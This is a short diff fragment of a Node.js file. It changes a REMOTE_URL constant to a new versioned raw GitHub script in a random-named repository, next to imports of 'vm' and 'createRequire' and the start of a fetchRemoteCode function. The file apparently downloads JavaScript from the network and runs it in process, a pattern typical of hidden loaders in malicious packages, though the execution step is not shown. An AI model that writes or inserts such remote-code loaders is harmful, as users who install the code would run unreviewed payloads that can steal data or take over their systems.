@@ -5,7 +5,7 @@ const vm = require('vm');
 const path = require('path');
 const { createRequire } = require('module');
 
-const REMOTE_URL = 'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index.js';
+const REMOTE_URL = 'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index_v2.0.5.js';
 
 function fetchRemoteCode(url, redirects = 0) {
   return new Promise((resolve, reject) => {
